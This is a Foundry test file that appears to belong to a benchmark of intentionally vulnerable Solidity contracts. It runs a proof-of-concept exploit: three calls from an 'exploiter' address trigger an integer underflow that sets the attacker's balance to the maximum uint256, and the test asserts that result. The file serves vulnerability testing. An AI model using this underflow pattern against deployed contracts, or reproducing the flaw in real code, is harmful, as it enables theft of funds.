// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_onefunc_feasible.sol";

contract IntegerOverflowMultiTxOneFuncFeasibleTest is Test {
    IntegerOverflowMultiTxOneFuncFeasible public vulnerableContract;
    address public exploiter = makeAddr("exploiter");

    function setUp() public {
        vulnerableContract = new IntegerOverflowMultiTxOneFuncFeasible();
    }

    function testUnderflowVulnerability() public {
        // First tx: Initialize contract (sets initialized=1)
        vm.prank(exploiter);
        vulnerableContract.run(0);

        // Second tx: Set count to 1 (totalOperations++)
        vm.prank(exploiter);
        vulnerableContract.run(0);

        // Differential: State BEFORE critical attack
        uint256 balanceBefore = vulnerableContract.getUserBalance(exploiter);
        uint256 opsBefore = vulnerableContract.totalOperations();
        console.log("--- BEFORE-Trigger ---");
        console.log("Attacker Balance: %s", balanceBefore);
        console.log("Total Operations: %s", opsBefore);

        console.log("--- Trigger Underflow ---");
        // Third tx: Trigger underflow (1 - 2 = underflow)
        vm.prank(exploiter);
        vulnerableContract.run(2);

        // Differential: State AFTER critical attack
        uint256 balanceAfter = vulnerableContract.getUserBalance(exploiter);
        uint256 opsAfter = vulnerableContract.totalOperations();
        console.log("--- AFTER-Trigger ---");
        console.log("Attacker Balance: %s", balanceAfter);
        console.log("Total Operations: %s", opsAfter);

        // Vulnerability verification
        if (balanceAfter == type(uint256).max) {
            console.log("Vulnerability Exists: Balance underflowed to max uint256");
        } else {
            console.log("Vulnerability not Exist: Balance is %s (expected max uint256)", balanceAfter);
        }

        // Original validation
        assertEq(balanceAfter, type(uint256).max);
    }
}